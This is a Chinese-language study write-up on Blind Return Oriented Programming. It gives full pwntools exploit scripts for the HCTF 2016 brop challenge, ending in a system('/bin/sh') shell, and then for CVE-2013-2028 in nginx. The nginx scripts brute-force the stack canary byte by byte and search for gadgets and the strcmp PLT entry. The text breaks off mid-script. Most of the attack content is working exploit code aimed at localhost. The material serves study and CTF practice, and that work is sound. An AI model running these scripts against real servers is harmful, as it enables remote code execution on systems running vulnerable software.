# BROP技术学习

BROP（Blind Return Oriented Programming）基于一篇发表在Oakland 2014的论文Hacking Blind,它可以不需要源代码、程序，并且绕过各种保护机制: NX、ASLR、PIE、Canary。

参考链接： https://www.scs.stanford.edu/brop/

实现BROP攻击的话，需要满足两个条件

```
1、目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
2、目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变。比如通过fork函数开启子进程交互，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的。
```

我们先从一个少一些保护机制的题目开始

## 2016-hctf-brop

[出题人源码链接](https://github.com/zh-explorer/hctf2016-brop)

### 环境搭建

#### 方法一

```
touch brop.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int i;
int check();
int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("WelCome my friend,Do you know password?");
        if(!check()) {
            puts("Do not dump my memory");
        } else {
            puts("No password, no game");
        }
}
int check() {
    char buf[50];
    read(STDIN_FILENO, buf, 1024);
    return strcmp(buf, "aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}

gcc -z noexecstack -fno-stack-protector -no-pie brop.c

sudo apt update & sudo apt install socat

touch con.sh
#!/bin/sh
while true; do
        num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
        if [ $num -lt 5 ]; then
                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &
        fi
done

nohup bash con.sh &

nc -nv 127.0.0.1 10001
可以正常使用
```

#### 方法二

```
apt-get install docker-io

git clone https://github.com/Eadom/ctf_xinetd.git

1、将题目a.out放到bin目录下
2、修改 flag 文本内容 为你指定的 flag
3、紧接着修改 ctf.xinetd 的服务：
port为指定端口
server_args = --userspec=1000:1000 /home/ctf ./a.out

修改dockerfile ubuntu16.04 改成ubuntu18.04

在git下的目录下
docker build -t "brop" .
docker run -d -p "0.0.0.0:9999:9999" -h "brop" --name="brop" brop

nc 127.0.0.1 9999
可以正常访问
```

### 题目分析

checksec a.out

```sh
root@stu-virtual-machine:~/study/brop# checksec a.out 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/root/study/brop/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    
canary未开启，开启了NX
```

我们nc访问一下

![image-20220802141408651](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802141408651.png)

#### 找到返回地址

首先我们试出函数的返回地址，我们每次添加一个字节的数据进去，当正常写入数据时，程序会正常返回"No password, no game"，当我们写入的数据溢出覆盖到返回地址，程序就会报错退出，我们利用recv函数就会接收不到数据，借助这一点，我们可以确定函数的返回地址。

使用探测脚本

```python
# -*- coding:utf-8 -*-
#from __future__ import print_function
from pwn import *
context.log_level = "DEBUG"
def get_offset():
    i = 1
    while 1:
        try:
            p = remote("127.0.0.1",9999)
            p.recvline("WelCome my friend,Do you know password?")
            payload = 'a'*i
            p.sendline(payload)
            p.recvline("No")
            p.close()
            log.info("%d is not enough",i)
            i = i+1
        except EOFError:
            p.close()
            log.info("buf_size:%d",i)
            return i

if __name__ == "__main__":
    buf_size = get_offset()
```

![image-20220802152424349](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802152424349.png)

我们获取到当我们输入数据大于72时，会覆盖到函数返回地址导致程序异常退出，我们的recvline函数接收不到数据就会触发异常。因此我们需要先填充72个字符。

#### 找到stop gadget

我们知道返回地址位置的时候，就相当于可以控制RIP寄存器了，但是由于我们没有这个二进制文件、也没有libc版本，只能靠盲打改变返回地址的值，但是一般情况我们盲打输入的地址会把程序搞崩溃，返回地址指到不可执行的地址或者一些无效的指令，这种地址我们可以叫做`crash gadget`或者是`bad gadget`，这种返回地址会让我们断开程序的连接。

我们的目标是寻找到`"pop rdi ret"`等等`有用的gadget`也叫`useful gadget`

为了让我们判断是否找到`useful gadget`，我们需要找到一个地址（stop gadget），执行了stop gadget时，就会让程序挂起(等待输入/陷入循环等等)，但是与程序的连接不会断开。stop gadget能够将stop gadget之前的指令执行的结果通过连接顺利反馈给我们，之后连接也不会断开。

当我们主函数执行时，程序输出`"WelCome my friend,Do you know password?"`保持连接等待输入，我们可以把它来当作stop gadget。下面我们来寻找。

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

context.log_level = "DEBUG"

def get_stop_gadget(buf_size,start_addr=0x400000):
    stop_gadget = start_addr
    while 1:
        stop_gadget+=1
        payload = 'a'*buf_size + p64(stop_gadget)
        try:
            p = remote("127.0.0.1",9999)
            p.recvline("password?")
            p.sendline(payload)
            checkstr = p.recvline(timeout=0.5)
            p.close()
            log.info("find one stop gadget: 0x%x",stop_gadget)
            if "WelCome" in checkstr:
                log.info("start address: 0x%x",stop_gadget)
                return stop_gadget
        except EOFError:
            p.close()
            log.info("not 0x%x,try harder",stop_gadget)
if __name__ == "__main__":
    buf_size = 72
    stop_gadget = get_stop_gadget(buf_size)
```

![image-20220802185706227](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802185706227.png)

我们找到了能够进入主函数的地址0x400590，实际上来看这里是_start函数

![image-20220802171709116](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802171709116.png)

#### 寻找useful gadget

在 `x64` 的 `Linux` 用户空间环境中，参数都是通过寄存器来实现的，具体如下：

##### 内核接口

内核接口使用的寄存器有`rdi`、`rsi`、`rdx`、`r10`、`r8`和`r9`。系统调用通过`syscall`指令完成。除了`rcx`、`r11`和`rax`，其他的寄存器都被保留。系统调用的编号必须在寄存器 `rax` 中传递。系统调用的参数限制为6个，不直接从堆栈上传递任何参数。返回时，`rax` 中包含了系统调用的结果，而且只有 `INTEGER` 或者 `MEMORY` 类型的值才会被传递给内核。

##### 用户接口

`x86-64` 下通过寄存器传递参数，这样做比通过栈具有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 `MEMORY`，则在栈上传递参数。如果类型是`INTEGER`，则顺序使用 `rdi`、`rsi`、`rdx`、`rcx`、`r8` 和 `r9`。所以如果有多于 `6` 个的 `INTEGER` 参数，则后面的参数在栈上传递。

什么是 `useful gadget` 取决于要利用哪个函数做哪些事，在 `BROP` 的攻击中基本上都是利用 `write` 函数和 `puts` 函数来 `dump` 内存。

puts

```c
int puts(const char *str);
str：要被写入的字符串。
返回值：如果成功，该函数返回一个非负值为字符串长度（包括末尾的 **\0**），如果发生错误则返回 EOF。(我去尝试了，没发生错误的话，返回值一直是0，想看字符串长度还是用strlen好使)
```

puts 函数就一个参数,所以按照用户接口的函数调用约定，只需要在 `rdi` 寄存器中设置参数就可以了，那我们需要的 `useful gadget` 就是 `pop rdi; ret` ，这个 gadget 的意思就是将栈顶的内容存储到 `rdi` 寄存器中，之后再将更新后的栈顶的地址存储到 `RIP` 寄存器中，之后系统就会执行 `RIP` 寄存器中存储的地址所指向的指令。

write

```c
ssize_t write(int handle, void *buf, int nbyte)
handle 是 文件描述符；
buf是指定的缓冲区，即 指针，指向一段内存单元；
nbyte是要写入文件指定的字节数；
返回值：写入文档的字节数（成功）；-1（出错）
```

`write` 函数共有三个参数，所以按照用户接口的函数调用约定，需要分别在 `rdi、rsi、rdx`分别设置参数，那么需要的`useful gadget` 就比较复杂了，可以分别找到 `pop rdi;ret`、`pop rsi;ret`、`pop rdx; ret`，这三个顺序可以变化，赋值顺序也跟着变就好了，当然也可以进行一些组合，比如 `pop rdi;pop rsi;ret`、`pop rdx;ret` 、 `pop rdi;pop rsi; pop rdx;ret` 。

这题我们使用puts函数，那我们就需要找到`pop rdi; ret`这个`useful gadget`

在64位程序中,有一个万能的gadget能被我们利用

```assembly
5b                   	pop    rbx
5d                   	pop    rbp
41 5c                	pop    r12
41 5d                	pop    r13
41 5e                	pop    r14
41 5f                	pop    r15
c3                   	ret
```

我们通过查看`pop rdi; ret`的硬编码

![image-20220802180929960](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802180929960.png)

```assembly
41 5f                	pop    r15
c3                   	ret

5f                      pop    rdi
c3                      ret
```

我们只要控制我们的`指令指针寄存器RIP` 从`5f`开始解析就可以拿到我们的`useful gadget`，那现在我们的任务就是找到这堆指令的地址

```
pop    rbx; pop    rbp; pop    r12; pop    r13; pop    r14; pop    r15; ret;
```

我们把stop gadget放在 6个pop的数据后面，我们找到了这个通用的gadget，程序就会连续pop6次然后ret的地址为我们的stop_gadget，我们就找到了这堆指令

```
payload = 'a' * buf_size + p64(useful_gadget) + p64(1) * 6 + p64(stop_gadget)
```

上脚本

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

context.log_level = "DEBUG"

def get_useful_gadget(buf_size, stop_gadget, start_addr=0x400000):
    useful_gadget = start_addr
    stop_gadget = stop_gadget
    while 1:
        useful_gadget += 1
        payload = 'a' * buf_size + p64(useful_gadget) + p64(1) * 6 + p64(stop_gadget)
        try:
            p = remote("127.0.0.1", 9999)
            p.recvline("password?")
            p.sendline(payload)
            checkstr = p.recvline(timeout=0.5)
            p.close()
            if "WelCome" in checkstr:
                try:
                    payload = 'a' * buf_size + p64(useful_gadget) + p64(0) * 7
                    p = remote("127.0.0.1", 9999)
                    p.recvline("password?")
                    p.sendline(payload)
                    checkstr = p.recvline(timeout=0.5)
                    p.close()
                except EOFError:
                    p.close()
                    log.info("find user gadget: 0x%x", useful_gadget)
                    return useful_gadget
        except EOFError:
            p.close()
            log.info("not 0x%x,try harder", useful_gadget)


if __name__ == "__main__":
    buf_size = 72
    stop_gadget = 0x400590
    useful_gadget = get_useful_gadget(buf_size, stop_gadget)
```

得到通用的gadget地址0x40078a

![image-20220802192342555](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802192342555.png)

我们使用objdump -d [文件]去看的话，实际上也是对的

![image-20220802192530041](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802192530041.png)

那么 `pop rdi；ret` 的地址就是useful gadget + 9  = 0x40078a + 9 = 0x400793

#### 寻找puts函数的plt

我们已经可以控制rdi参数的值了，我们就可以给puts提供参数，我们从基地址开始遍历，如果执行到某个地址的指令真的把我们提供的参数打印了出来，那么这个地址就是 `puts` 的 `plt` 地址了，`Linux ELF`文件最开始的几个字节是 `Linux` 的模数，是固定的字符 `\x7f\x45\x4c\x46` （"\x7fELF"）,也就是说 `0x400000` 地址存储的内容是字符 `\x7fELF` 那么就以这个地址为参数，看看遍历到哪个地址的时候会打印出  `\x7fELF`

![image-20220802194235195](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220802194235195.png)

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

context.log_level = "DEBUG"

def get_puts_plt(buf_size, stop_gadget, useful_gadget, start_addr=0x400000):
    pop_rdi_ret = useful_gadget + 9
    strelf_addr = 0x400000
    puts_plt = start_addr
    while 1:
        puts_plt += 1
        payload = 'a' * buf_size + p64(pop_rdi_ret) + p64(strelf_addr) + p64(puts_plt)+p64(stop_gadget)
        try:
            p = remote("127.0.0.1",9999)
            p.recvline("password?")
            p.sendline(payload)
            checkstr1 = p.recvline(timeout=0.5)
            checkstr2 = p.recvline(timeout=0.5)
            if ('\x7fELF' in checkstr1) and ('WelCome' in checkstr2):
                p.close()
                log.info("find puts_plt address: 0x%x",puts_plt)
                return puts_plt
        except EOFError:
            p.close()
            log.info("not 0x%x, keep find",puts_plt)

if __name__ == "__main__":
    buf_size = 72
    stop_gadget = 0x400590
    useful_gadget = 0x40078a
    puts_plt = get_puts_plt(buf_size, stop_gadget, useful_gadget)
```

![image-20220803143649382](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803143649382.png)

得到puts_plt的地址为0x400545

#### dump 内存

有了 `puts的plt地址`我们就可以调用` puts函数`来打印每一个地址的内容了，我们用它来 `dump` 内存。我们的目的是`getshell`，就需要 `system` 函数和 `/bin/sh` 字符串的地址，这个地址在 `libc` 中。我们获取了`puts的plt地址`，`puts的plt地址`记录的是`puts函数在got表中的地址`，而`puts函数在got表中的地址`是`libc`加载到内存后，`puts函数`执行的真实地址。因此我们通过`puts函数`打印内存，来寻找 `puts` 的 `got`，进而找到`libc`加载到内存后的地址情况。

![延迟绑定](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803151132582.png)

puts 函数通过 `\x00` 进行截断，并且会在每一次输出末尾加上换行符 `\x0a`，所以有一些特殊情况需要做一些处理，比如单独的 `\x00`、`\x0a` 等，首先当然是先去掉末尾 puts 自动加上的 `\n`，然后如果 recv 到一个 `\n`，说明内存中是 `\x00`，如果 recv 到一个 `\n\n`，说明内存中是 `\x0a`

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

context.log_level = "DEBUG"

def dump_data(buf_size, stop_gadget, useful_gadget, puts_plt, start_addr=0x400000, end_addr=0x401000):
    pop_rdi_ret = useful_gadget + 9
    result = ""
    while start_addr < end_addr:
        payload = 'a' * buf_size + p64(pop_rdi_ret) + p64(start_addr) + p64(puts_plt) + p64(stop_gadget)
        try:
            p = remote("127.0.0.1", 9999)
            p.recvline("password?")
            p.sendline(payload)
            accept_str0 = p.recv(timeout=0.5)
            if 'WelCome' in accept_str0:
                num = accept_str0.find("WelCome")
                accept_str = accept_str0[:num]
            if num==0:
                p.close()
                log.info("end_addr = 0x%x",end_addr)
                return result
            if accept_str == '\n':
                accept_str1 = '\x00'
            elif accept_str[-1:] == '\n':
                accept_str1 = accept_str[:-1] + '\x00'
            else:
                accept_str1 = accept_str

            result += accept_str1
            start_addr += len(accept_str1)
            p.close()
        except:
            log.info("connect error")
    return result

if __name__ == "__main__":
    buf_size = 72
    stop_gadget = 0x400590
    useful_gadget = 0x40078a
    puts_plt = 0x400545
    dumpdata = dump_data(buf_size, stop_gadget, useful_gadget, puts_plt)
    with open("dumpdata","wb") as f:
        for x in dumpdata:
            f.write(x)
```

dump下来后，利用ida查看，得到 `puts` 的 `got`地址为0x601018

![image-20220803174224324](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803174224324.png)

#### 获取puts函数真正运行的地址

我们可以通过使用 `puts_plt` 来打印 `puts_got` 地址所指的内容，但是我们没有目标使用的 `libc` ，如果目标开启了 `ASLR`，那么无法通过偏移来计算出 `system` 函数和 `/bin/sh`的地址。但是在 `Linux` 的 `ASLR` 中有一些缺陷，函数在内存中的地址是随机化的，即使程序有 `ASLR` 保护，也只是针对于地址中间位进行随机，，内存地址的末尾 `12 bit` 的内容是不随机的，也就是说我们可以先获取 `puts` 的 `got` 中的地址，之后获取最后 `3` 位，之后和所有的 `libc` 版本的地址进行比较，看看能匹配哪一个，我们先获取 `puts` 的 `got` 中保存的地址。

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

def get_puts_addr(buf_size, stop_gadget, useful_gadget, puts_plt, puts_got):
    pop_rdi_ret = useful_gadget + 9
    payload = 'a'*buf_size + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
    try:
        p = remote("127.0.0.1",9999)
        p.recvline("password?")
        p.sendline(payload)
        accept_str = p.recvline(timeout=0.5)
        put_addr = u64(accept_str[:-1]+'\x00\x00')
        log.info("put_address: 0x%x",put_addr)
        return put_addr
    except:
        log.info("connect error")

if __name__ == "__main__":
    buf_size = 72
    stop_gadget = 0x400590
    useful_gadget = 0x40078a
    puts_plt = 0x400545
    puts_got = 0x601018
    put_addr = get_puts_addr(buf_size, stop_gadget, useful_gadget, puts_plt, puts_got)
```

![image-20220803194724957](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803194724957.png)

利用在线网址查询： https://libc.rip/

![image-20220803194957723](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803194957723.png)

我们使用的是64位的

libc6_2.27-3ubuntu1.5_amd64

libc6_2.27-3ubuntu1.6_amd64

他俩相对偏移是一样的

![image-20220803195159154](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220803195159154.png)

这样我们就获取到了 `system` 函数和 `/bin/sh` 相对于 `puts libc`起始地址的偏移 ，`libc`的起始地址 = `puts_addr` - `puts_offset`

那我们通过动态获取到puts_addr的地址来计算相对偏移就能完成我们的getshell

#### getshell

`Ubuntu 18.04` 及以后版本中，在调用调用printf或是system时，程序会使用movaps对内存对齐对其进行检查，该指令（movaps）需要`rsp`按照16字节对齐，ret指令可以让rsp+8,帮助我们对齐。

```python
# -*- coding:utf-8 -*-
from __future__ import print_function
from pwn import *

context.log_level = "DEBUG"

def get_puts_addr_getshell(buf_size, stop_gadget, useful_gadget, puts_plt, puts_got,offset_puts,offset_system,offset_bin_sh):
    pop_rdi_ret = useful_gadget + 9
    payload = 'a'*buf_size + p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(useful_gadget + 10)+ p64(system_addr) + p64(stop_gadget)
    try:
        p = remote("127.0.0.1",9999)
        p.recvline("password?")
        p.sendline(payload)
        accept_str = p.recvline(timeout=0.5)
        put_addr = u64(accept_str[:-1]+'\x00\x00')
        log.info("put_address: 0x%x",put_addr)
        system_addr = put_addr - offset_puts + offset_system
        bin_sh_addr = put_addr - offset_puts +offset_bin_sh
        payload = 'a'*buf_size + p64(pop_rdi_ret) + p64(bin_sh_addr) +p64(useful_gadget + 10)+ p64(system_addr) + p64(stop_gadget)
        p.sendline(payload)
        p.interactive()
        return put_addr
    except:
        log.info("connect error")

if __name__ == "__main__":
    buf_size = 72
    stop_gadget = 0x400590
    useful_gadget = 0x40078a
    puts_plt = 0x400545
    puts_got = 0x601018
    offset_puts = 0x80970
    offset_system = 0x4f420
    offset_bin_sh = 0x1b3d88
    put_addr = get_puts_addr_getshell(buf_size, stop_gadget, useful_gadget, puts_plt, puts_got,offset_puts,offset_system,offset_bin_sh)
```

成功拿到shell

![image-20220804105716020](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220804105716020.png)

## CVE-2013-2028

我们现在来使用BROP技术来利用CVE-2013-2028这个漏洞

![image-20220726151343161](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220726151343161-16595821131601.png)

我们可以看到它多了一个canary进行保护

#### 绕过canary

![804631-20190111021220385-922883120](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/804631-20190111021220385-922883120.jpg)

那在我们爆破测试返回地址之前，我们需要先绕过canary，我们使用同样的方法，通过不断的去填充缓冲区，当它破坏canary的时候就会出现crash

```
（通过测试发现

我打入4000得数据，在栈中覆盖了3038的数据

我打入5000得数据，在栈中覆盖了4038的数据

我打入6000得数据，在栈中覆盖了5038的数据

我打入7000得数据，在栈中覆盖了6038的数据

我打入8000得数据，在栈中覆盖了7038的数据）
这里先留个记录 看一下是否影响后面的操作
```

但是 我检测到cannary开始的地址在5067的位置

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def get_canary_offset():
    i = 4096
    while 1:
        s=connect("127.0.0.1", 80)
        data1 = base_payload
        log.info("payload = %s\ni = %d", data1 + "A" * i, i)
        s.send(data1 + "A" * i)
        try:
            s.recv(1024)
            s.close()
            i = i+1
        except:
            s.close()
            log.info("canary_offset is:%d",i)
            return i
if __name__ == "__main__":
    canary_offset = get_canary_offset()

```

![image-20220804165240814](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220804165240814.png)

接着我们就可以按位爆破canary

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def get_canary(canary_offset):
    result = ""
    for i in range(0, 8):
        for j in range(0, 256):
            s = connect("127.0.0.1", 80)
            #log.info("payload : %s",base_payload + 'A' * canary_offset + result + chr(j))
            s.send(base_payload + 'A' * canary_offset + result + chr(j))
            try:
                s.recv(1024)
                log.info("canary[%d]:%02x",len(result),j)
                s.close()
                break
            except:
                log.info("canary[%d] not:0x%02x", len(result), j)
            s.close()
        result += chr(j)
    return result
    
if __name__ == "__main__":
    # canary_offset = get_canary_offset()
    canary_offset = 5066
    canary = get_canary(canary_offset)
    print(''.join(["\\x%02x" % ord(x) for x in canary]).strip())
```

![image-20220804172426487](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220804172426487.png)

拿到canary = "\x00\x86\xd5\x0f\x2e\xbe\x4c\xaf"

#### 寻找返回地址

canary和返回地址之间还有栈底指针，我们现在爆破出返回地址的位置

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def get_buf_size(canary_offset,canary):
    i = 1
    while 1:
        s = connect("127.0.0.1", 80)
        s.send(base_payload + "A" * canary_offset + canary + 'A'*i)
        try:
            s.recv(1024)
            s.close()
            log.info("buf_size not is:%d", i)
            i = i + 1
        except:
            s.close()
            log.info("buf_size is:%d", i)
            return i

if __name__ == "__main__":
    # canary_offset = get_canary_offset()
    #canary = get_canary(canary_offset)
    #print(''.join(["\\x%02x" % ord(x) for x in canary]).strip())
    canary_offset = 5066
    canary = "\x00\x86\xd5\x0f\x2e\xbe\x4c\xaf"
    buf_size = get_buf_size(canary_offset,canary)
```

![image-20220804173603325](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220804173603325.png)

返回地址就在canary+24之后的位置上

#### 寻找stop gadget

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def get_stop_gadget(canary_offset,canary,buf_size,start_addr = 0x400000):
    stop_gadget = start_addr
    while 1:
        stop_gadget = stop_gadget + 1
        s = connect("127.0.0.1", 80)
        s.send(base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(stop_gadget) )
        try:
            checkstr = s.recv(timeout=0.5)
            s.close()
            log.info("find one stop gadget: 0x%x", stop_gadget)
            return stop_gadget
        except:
            s.close()
            log.info("not 0x%x,try harder", stop_gadget)

if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x25\x9f\xb2\xfb\x45\x4b\x85"
    buf_size = 24
    stop_gadget = get_stop_gadget(canary_offset,canary,buf_size)
```

找到了一处stop gadget，但是好像陷入了巨大的循环出不来

![image-20220804193755146](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220804193755146.png)

我们需要找到短暂stop，我们可以利用多次调用同一个plt函数让程序短暂的stop下来。接下来我们跳过这个地址，我们使用0x10*30作为一块的探索范围

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "error"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""


def get_stop_gadget(canary_offset,canary,buf_size,start_addr = 0x400000):
    stop_gadget = start_addr
    while 1:
        for i in range(1,45):
            s = connect("127.0.0.1", 80)
            s.send(base_payload + "A" * canary_offset + canary +'a'*buf_size+ p64(stop_gadget)*i)
            try:
                checkstr = s.recv(timeout=0.5)
                s.close()
                log.info("find one stop gadget: 0x%x deth %d:", stop_gadget,i)
                return stop_gadget,i
            except:
                s.close()
                log.info("not 0x%x,try harder deth %d", stop_gadget,i)
        stop_gadget += 0x10 * 30



if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x2d\x8a\x57\xe7\x59\xcc\x69"
    buf_size = 24
    stop_gadget,depth = get_stop_gadget(canary_offset, canary, buf_size)
```

找到能够短暂停留0.5秒的stop gadget，需要连续填充44次

![image-20220808104221363](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808104221363.png)

通过ida看到这里是unlink的plt

![image-20220808135716244](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808135716244.png)

#### 寻找useful gadget

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

# context.log_level = "error"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def check_pop_ret1(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget):
    useful_gadget = useful_gadget + 1
    s = connect("127.0.0.1", 80)
    s.send(base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget+2) + p64(1) * 6 + p64(stop_gadget) * (depth - 7))
    try:
        checkstr = s.recv(timeout=0.5)
        s.close()
        log.info("checking1 out :0x%x", useful_gadget)
        sleep(2)
        return 0
    except:
        s.close()
        log.info("checking1 pass :0x%x", useful_gadget)
        return 1



def check_pop_ret2(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget):
    useful_gadget = useful_gadget + 1
    s = connect("127.0.0.1", 80)
    s.send(base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget+9) + p64(1)  + p64(stop_gadget) * (depth - 2))
    try:
        checkstr = s.recv(timeout=0.5)
        s.close()
        log.info("checking2 out :0x%x", useful_gadget)
        sleep(2)
        return 0
    except:
        s.close()
        log.info("checking2 pass :0x%x", useful_gadget)
        return 1

def get_useful_gadget(canary_offset, canary, buf_size, stop_gadget, depth, start_addr=0x400000):
    useful_gadget = start_addr
    while 1:
        useful_gadget = useful_gadget + 1
        s = connect("127.0.0.1", 80)
        s.send(base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget) + p64(1) * 6 + p64(stop_gadget) * (depth - 7))
        try:
            checkstr = s.recv(timeout=0.5)
            s.close()
            log.info("find useful_gadget 0x%x checking", useful_gadget)
            sleep(2)
            checking1 = check_pop_ret1(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget)
            checking2 = check_pop_ret2(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget)
            if checking1==1 and checking2==1:
                log.info("find True useful_gadget 0x%x", useful_gadget)
                sleep(2)
                return useful_gadget
            else:
                log.info("useful_gadget not 0x%x", useful_gadget)
        except:
            s.close()
            log.info("useful_gadget not 0x%x", useful_gadget)

if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x2d\x8a\x57\xe7\x59\xcc\x69"
    buf_size = 24
    stop_gadget = 0x402580
    depth = 44
    #useful_gadget = 0x430c5f
    # canary_offset = get_canary_offset() - 1
    # canary = get_canary(canary_offset)
    # print(''.join(["\\x%02x" % ord(x) for x in canary]).strip())
    # buf_size = get_buf_size(canary_offset,canary) - 1
    # stop_gadget,depth = get_stop_gadget(canary_offset, canary, buf_size)
    useful_gadget = get_useful_gadget(canary_offset, canary, buf_size, stop_gadget, depth)
```

![image-20220808135440912](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808135440912.png)

![image-20220808135812496](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808135812496.png)

我们找到了useful gadget的位置，useful gadget - 9 就是pop rdi;ret; useful gadget - 7就是pop rsi;pop r15;ret;

#### 寻找strcmp

我们需要利用write函数来进行dump内存，出了控制rdi和rsi，我们还需要控制rdx，而strcmp的汇编功能是对rdx赋予一个长度值，我们可以通过这种方法控制rdx。strcmp函数就是对比两个字符串的内容是否相等，如果其中有一个字符指向不可读的地址，程序就会崩溃，访问超过vsyscall的地址处strcmp函数也不会报错。结合该函数的这些特点，我们可以写出下面测试条件这些作为是否是strcmp函数的判断。（vsyscall的加载地址依然不变，始终为0xffffffffff600000 - 0xffffffffff601000）

设置正常的访问地址 trueaddr = 0x400000，无法访问的地址 erroraddr1 = 0x1、erroraddr2 = 0x2，以及特殊的地址vsyscall+0x1000-1

```c
strcmp(erroraddr1,erroraddr2); 		==> error
strcmp(trueaddr,erroraddr2); 		==> error
strcmp(erroraddr1,trueaddr); 		==> error
strcmp(trueaddr,trueaddr); 			==> stop
strcmp(vsyscall+0x1000-1,trueaddr);	==> stop
```

上脚本

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

# context.log_level = "error"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

vsyscall = 0xffffffffff600000

def get_strcmp_plt(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,start_addr = 0x400000):
    trueaddr = 0x400000
    erroraddr1 = 0x1
    erroraddr2 = 0x2
    strcmp_plt = start_addr
    while 1:
        strcmp_plt = strcmp_plt + 0x10
        if check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,erroraddr1,erroraddr1)==1:
            log.info("1 strcmp(erroraddr1,erroraddr2) out 0x%x",strcmp_plt)
            continue
        if check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,trueaddr,erroraddr2)==1:
            log.info("2 strcmp(trueaddr,erroraddr2) out 0x%x", strcmp_plt)
            continue
        if check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,erroraddr1,trueaddr)==1:
